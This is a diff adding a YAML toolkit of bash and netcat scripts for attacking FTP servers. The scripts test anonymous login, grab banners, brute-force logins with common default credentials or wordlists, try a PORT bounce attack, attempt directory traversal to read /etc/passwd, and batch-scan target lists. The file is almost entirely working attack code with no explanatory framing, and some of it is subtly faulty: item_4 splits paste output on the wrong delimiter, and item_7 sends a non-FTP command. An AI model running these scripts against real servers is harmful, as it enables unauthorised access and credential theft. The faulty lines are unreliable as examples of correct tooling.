@@ -1,0 +1,241 @@
+description: FTP pentesting using nc
+author: Kraus17th
+tags:
+  - ftp
+  - pentest
+  - security
+  - nc
+  - brute
+  - bounce
+  - anon
+
+arguments:
+  l:
+    default: []
+    multiple: true
+    replacer: __TARGET__
+    description: IP, hostname or file with IP list
+
+  u:
+    default:
+      - ''
+    multiple: true
+    replacer: __USERS__
+    description: usernames file or list for brute-force
+
+  p:
+    default:
+      - ''
+    multiple: true
+    replacer: __PASSWORDS__
+    description: passwords file or list for brute-force
+
+  b:
+    default:
+      - ''
+    replacer: __BOUNCE_TARGET__
+    description: target IP for bounce attack testing
+
+  t:
+    default:
+      - 5
+    replacer: __TIMEOUT__
+    description: connection timeout in seconds
+
+shell: bash
+
+item_1:
+  description: anonymous access check (single or batch)
+  script: |
+    #!/bin/bash
+    # Check anonymous FTP access on port 21 with colored output
+    # Colors
+    if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
+      GREEN="\033[1;32m"
+      RED="\033[1;31m"
+      YELLOW="\033[1;33m"
+      RESET="\033[0m"
+    else
+      GREEN=""
+      RED=""
+      YELLOW=""
+      RESET=""
+    fi
+    set -euo pipefail
+    echo -e "${YELLOW}[+] Testing anonymous FTP access...${RESET}"
+    if [[ -f "__TARGET__" ]]; then
+      while IFS= read -r ip; do [[ -z $ip ]] && continue
+        if timeout __TIMEOUT__ bash -c "echo -e 'USER anonymous\nPASS -\nQUIT' | nc -w 3 '$ip' 21 2>/dev/null" | grep -q "230"; then
+          echo -e "${GREEN}[+] $ip: ANONYMOUS OK${RESET}"
+        else
+          echo -e "${RED}[-] $ip: ANONYMOUS DENIED${RESET}"
+        fi
+      done < "__TARGET__"
+    else
+      if timeout __TIMEOUT__ bash -c "echo -e 'USER anonymous\nPASS -\nQUIT' | nc -w 3 '__TARGET__' 21 2>/dev/null" | grep -q "230"; then
+        echo -e "${GREEN}[+] __TARGET__: ANONYMOUS ACCESS ALLOWED${RESET}"
+      else
+        echo -e "${RED}[-] __TARGET__: Anonymous denied${RESET}"
+      fi
+    fi
+
+item_2:
+  description: banner grabbing and version detection
+  script: |
+    #!/bin/bash
+    # FTP banner grabbing for server fingerprinting
+    # Colors
+    if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
+      CYAN="\033[1;36m"
+      GREEN="\033[1;32m"
+      RED="\033[1;31m"
+      RESET="\033[0m"
+    else
+      CYAN=""
+      GREEN=""
+      RED=""
+      RESET=""
+    fi
+    echo -e "${CYAN}[+] Grabbing FTP banner(s)...${RESET}"
+    # If __TARGET__ is a file with IP list
+    if [[ -f "__TARGET__" ]]; then
+      exec 9<"__TARGET__"
+      while IFS= read -r ip <&9; do
+        if [ -z "$ip" ]; then
+          continue
+        fi
+        banner=$(timeout __TIMEOUT__ bash -c "nc -w 3 \"$ip\" 21 2>/dev/null" | head -1) || true
+        if [ -n "$banner" ]; then
+          echo -e "${GREEN}[+] $ip: ${banner}${RESET}"
+        else
+          echo -e "${RED}[-] $ip: no banner / no response${RESET}"
+        fi
+      done
+      exec 9<&-
+    else
+      banner=$(timeout __TIMEOUT__ bash -c "nc -w 3 \"__TARGET__\" 21 2>/dev/null" | head -1) || true
+      if [ -n "$banner" ]; then
+        echo -e "${GREEN}[+] __TARGET__: ${banner}${RESET}"
+      else
+        echo -e "${RED}[-] __TARGET__: no banner / no response${RESET}"
+      fi
+    fi
+
+### TO DO
+
+item_3:
+  description: common credentials brute-force
+  script: |
+    #!/bin/bash
+    # Brute force common FTP username/password combinations
+    # Colors
+    if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
+      GREEN="\033[1;32m"
+      RED="\033[1;31m"
+      YELLOW="\033[1;33m"
+      BLUE="\033[1;34m"
+      RESET="\033[0m"
+    else
+      GREEN=""
+      RED=""
+      YELLOW=""
+      BLUE=""
+      RESET=""
+    fi
+    echo -e "${YELLOW}[+] Brute forcing common credentials...${RESET}"
+    # Common and default usernames/passwords seen in FTP attacks and default creds lists
+    # (admin/root/user/ftp/guest + simple numeric and 'password' variants) [web:134][web:135][web:141][web:145]
+    common_users="admin root ftp user guest test anonymous demo"
+    common_pass="admin password Password 123 1234 12345 123456 12345678 123456789 admin123 admin@123 root 0000 1111 qwerty ftp guest '' -"
+    brute_one() {
+      local ip="$1"
+      local tried=0
+      echo -e "${BLUE}[+] Target: $ip${RESET}"
+      for user in $common_users; do
+        for pass in $common_pass; do
+          tried=$((tried+1))
+          echo -ne "${YELLOW}[*] Trying $user:$pass\r${RESET}"
+          if timeout __TIMEOUT__ bash -c "echo -e 'USER $user\nPASS $pass\nQUIT' | nc -w 2 \"$ip\" 21 2>/dev/null" | grep -q "230"; then
+            echo -e "\n${GREEN}[+] VALID: $ip -> $user:$pass${RESET}"
+            return 0
+          else
+            echo -ne "${RED}[-] Failed $user:$pass\r${RESET}"
+          fi
+        done
+      done
+      echo -e "\n${RED}[-] No valid common creds for $ip (tried $tried combos)${RESET}"
+      return 1
+    }
+    if [[ -f "__TARGET__" ]]; then
+      exec 9<"__TARGET__"
+      while IFS= read -r ip <&9; do
+        if [ -z "$ip" ]; then
+          continue
+        fi
+        brute_one "$ip"
+      done
+      exec 9<&-
+    else
+      brute_one "__TARGET__"
+    fi
+
+
+item_4:
+  description: dictionary brute-force (files)
+  script: |
+    #!/bin/bash
+    # Dictionary brute force using users/passwords files
+    echo "[+] Dictionary brute force on __TARGET__..."
+    paste <(cat "__USERS__") <(cat "__PASSWORDS__") | while IFS=: read -r user pass; do
+      timeout 3 bash -c "echo -e 'USER $user\nPASS $pass\nQUIT' | nc -w 2 '__TARGET__' 21 2>/dev/null" | grep -q "230" &&
+      echo "[+] HIT: $user:$pass" && break 2
+    done
+
+item_5:
+  description: FTP bounce attack test
+  script: |
+    #!/bin/bash
+    # Test FTP bounce attack vulnerability (PORT command)
+    echo "[+] Testing FTP bounce __TARGET__ -> __BOUNCE_TARGET__:80..."
+    timeout 15 bash -c "
+      (echo 'USER anonymous'; echo 'PASS -'; sleep 1;
+       echo 'PORT __BOUNCE_TARGET__,1,1,1,1,80'; sleep 1; echo 'LIST';
+       echo 'QUIT') | nc -w 3 '__TARGET__' 21 2>/dev/null
+    " | grep -i 'port' && echo "[+] BOUNCE VULNERABLE!" || echo "[-] Bounce blocked"
+
+item_6:
+  description: directory traversal test
+  script: |
+    #!/bin/bash
+    # Test directory traversal vulnerabilities via RETR
+    echo "[+] Testing directory traversal on __TARGET__..."
+    payloads="../etc/passwd ../../../../../etc/passwd ../../../../etc/passwd"
+    for payload in $payloads; do
+      timeout 5 bash -c "
+        (echo 'USER anonymous'; echo 'PASS -'; echo 'RETR $payload'; echo 'QUIT') |
+        nc -w 3 '__TARGET__' 21 2>/dev/null
+      " | grep -i 'root:' && echo "[+] TRAVERSAL: $payload"
+    done
+
+item_7:
+  description: directory enumeration (requires anon access)
+  script: |
+    #!/bin/bash
+    # Enumerate FTP directories and files
+    echo "[+] Enumerating directories on __TARGET__..."
+    timeout 15 bash -c "
+      echo -e 'USER anonymous\nPASS -\nPWD\nLS\nDIR\nQUIT' | nc -w 5 '__TARGET__' 21 2>/dev/null
+    " | grep -E '^(150|226|drwxr|total)'
+
+item_8:
+  description: batch scan (targets file + table output)
+  script: |
+    #!/bin/bash
+    # Batch scan multiple targets with table output
+    echo "[+] Batch FTP scanning from __TARGET__ file"
+    printf "%-20s %-20s %-8s\n" "Target" "Banner" "Anon"
+    while IFS= read -r ip; do [[ -z $ip ]] && continue
+      banner=$(timeout 3 bash -c "nc -w 2 '$ip' 21 2>/dev/null" | head -1)
+      anon=$(timeout 5 bash -c "echo -e 'USER anonymous\nPASS -\nQUIT' | nc -w 2 '$ip' 21 2>/dev/null" | grep -q "230" && echo "YES" || echo "NO")
+      printf "%-20s %-20s %-8s\n" "$ip" "${banner:0:19}" "$anon"
+    done < "__TARGET__"
